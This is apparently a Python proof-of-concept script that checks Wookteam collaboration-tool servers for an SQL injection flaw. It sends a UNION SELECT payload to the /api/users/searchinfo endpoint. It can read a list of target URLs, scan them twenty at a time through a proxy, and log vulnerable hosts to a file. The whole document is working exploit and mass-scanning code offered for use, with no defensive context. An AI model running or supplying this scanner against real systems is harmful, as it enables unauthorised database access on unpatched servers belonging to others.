import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """

                    _    _                       
                   | |  | |                      
__      _____  _ __| | _| |_ ___  __ _ _ __ ___  
\ \ /\ / / _ \| '__| |/ / __/ _ \/ _` | '_ ` _ \ 
 \ V  V / (_) | |  |   <| ||  __/ (_| | | | | | |
  \_/\_/ \___/|_| x  |_|\___\___|\__,_|_| |_| |_|
                                        阿迪
"""
    print(test)


def poc(target):
    payload = "/api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23"
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    headers = {
        "Accept-Encoding":"gzip,deflateAccept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    try:
        res1 = requests.get(url=target, verify=False, timeout=15,proxies=proxies,headers=headers)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload, verify=False, timeout=15,proxies=proxies,headers=headers)
            if "username" in res2.text:
                print(f"[+]{target}存在sql注入漏洞")
                with open("wookteam_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]{target}存在sql注入漏洞\n")
            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在问题，请手工测试")


def main():
    banner()
    parser = argparse.ArgumentParser(description="Wookteam团队在线协作工具SQL注入")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()